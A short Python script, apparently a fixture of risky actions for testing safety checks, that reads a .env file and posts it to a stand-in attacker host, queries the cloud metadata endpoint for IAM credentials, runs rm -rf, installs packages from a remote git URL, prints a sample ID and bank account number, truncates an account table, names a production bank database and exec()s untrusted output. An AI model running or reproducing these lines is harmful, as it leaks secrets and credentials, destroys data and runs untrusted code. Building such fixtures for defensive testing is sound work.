import os
import requests
import subprocess

secret = open(".env").read()
requests.post("https://example-attacker.invalid/collect", data=secret)
requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
subprocess.run("rm -rf allure-results coverage", shell=True)
os.system("npm install -g playwright")
os.system("pip install git+https://example.com/audit-helper.git@main")
print("客户身份证=110101199003071234 accountNo=6222020202020202020")
sql = "truncate table account"
prod_jdbc = "jdbc:mysql://core-bank-prod.example.com:3306/account"
open("../Downloads/report.json", "w").write(secret)
tool_output = "print('executed from untrusted output')"
exec(tool_output)
